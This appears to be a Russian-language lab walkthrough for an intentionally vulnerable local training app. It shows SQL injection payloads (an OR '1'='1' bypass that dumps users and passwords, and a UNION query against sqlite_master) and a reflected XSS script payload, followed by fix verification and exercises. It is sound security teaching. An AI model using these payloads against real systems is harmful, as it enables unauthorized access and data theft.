# Разбор атак на учебный стенд

Все примеры выполняются **только** против этого стенда на вашей машине (`http://localhost:5000`).
Исправления и объяснения — в [`SOLUTIONS.md`](../SOLUTIONS.md) и [`app/app_fixed.py`](../app/app_fixed.py).

## 1. SQL-инъекция в `/login`

В коде запрос собирается склеиванием строк:
```python
q = f"SELECT * FROM users WHERE name = '{user}'"
```

### Шаг 1 — убедиться, что ввод попадает в SQL
```bash
curl -G "http://localhost:5000/login" --data-urlencode "user=bob"
# {"result":[[2,"bob","hunter2"]]}

curl -G "http://localhost:5000/login" --data-urlencode "user='"
# HTTP 500 — одиночная кавычка сломала синтаксис запроса (OperationalError)
```
Ошибка при одиночной кавычке — признак инъекции.

### Шаг 2 — изменить логику условия
```bash
curl -G "http://localhost:5000/login" --data-urlencode "user=' OR '1'='1"
# {"result":[[1,"admin","s3cret"],[2,"bob","hunter2"]]}
```
Запрос превратился в `WHERE name = '' OR '1'='1'` — условие истинно для всех строк, и приложение вернуло всех пользователей
вместе с паролями.

### Шаг 3 — узнать структуру базы (UNION)
```bash
curl -G "http://localhost:5000/login" --data-urlencode "user=x' UNION SELECT 1,name,sql FROM sqlite_master --"
# {"result":[[1,"users","CREATE TABLE users(id INTEGER, name TEXT, pass TEXT)"]]}
```
Количество колонок в `UNION` должно совпадать с исходным запросом (три). Комментарий `--` отсекает оставшуюся часть запроса.

### Что выяснили
Нарушитель без пароля читает чужие данные и структуру базы. Причина — доверие к вводу при построении SQL.

## 2. Reflected XSS в `/search`
```bash
curl -s "http://localhost:5000/search?q=<b>test</b>"
# <h1>Результаты для: <b>test</b></h1>        ← теги не экранированы
```
В браузере откройте `http://localhost:5000/search?q=<script>alert(document.domain)</script>` — выполнится JavaScript.

## 3. Проверка исправлений
Запустите исправленную версию и повторите те же запросы:
```bash
cd app && python app_fixed.py
curl -G "http://localhost:5000/login" --data-urlencode "user=' OR '1'='1"
# {"result":[]}
curl -s "http://localhost:5000/search?q=<script>alert(1)</script>"
# <h1>Результаты для: &lt;script&gt;alert(1)&lt;/script&gt;</h1>
```
(Нужны `pip install -r app/requirements.txt`; остановите контейнер, если он занимает порт 5000.)

## Самостоятельные задания
1. Добавьте в стенд эндпоинт `/profile/<id>` без проверки владельца и найдите IDOR (обход авторизации по идентификатору).
   Затем исправьте: сравнивайте `id` из сессии с запрошенным.
2. Хранение паролей открытым текстом — тоже уязвимость. Замените их на хэши (`werkzeug.security.generate_password_hash`).
3. Добавьте ограничение числа запросов к `/login` и убедитесь, что подбор замедляется.
